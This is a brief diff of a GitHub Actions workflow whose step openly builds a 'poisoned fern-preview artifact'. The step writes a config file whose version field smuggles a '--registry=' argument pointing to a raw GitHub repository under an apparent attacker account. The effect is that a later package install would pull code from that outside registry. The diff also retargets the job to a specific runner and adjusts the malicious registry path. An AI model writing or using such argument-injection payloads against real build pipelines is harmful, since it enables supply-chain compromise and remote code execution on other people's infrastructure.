@@ -9,7 +9,7 @@ permissions:
 
 jobs:
   collect:
-    runs-on: ubuntu-latest
+    runs-on: linux-amd64-cpu32
     steps:
       - name: Build poisoned fern-preview artifact
         run: |
@@ -18,7 +18,7 @@ jobs:
           cat > build/fern/fern.config.json <<'JSON'
           {
             "organization": "nvidia",
-            "version": "5.190.0 --registry=https://raw.githubusercontent.com/lazyhacker6/npmreg/main/"
+            "version": "5.190.0 --registry=https://raw.githubusercontent.com/lazyhacker6/npmreg/main/r2/"
           }
           JSON
           cat > build/fern/docs.yml <<'YAML'
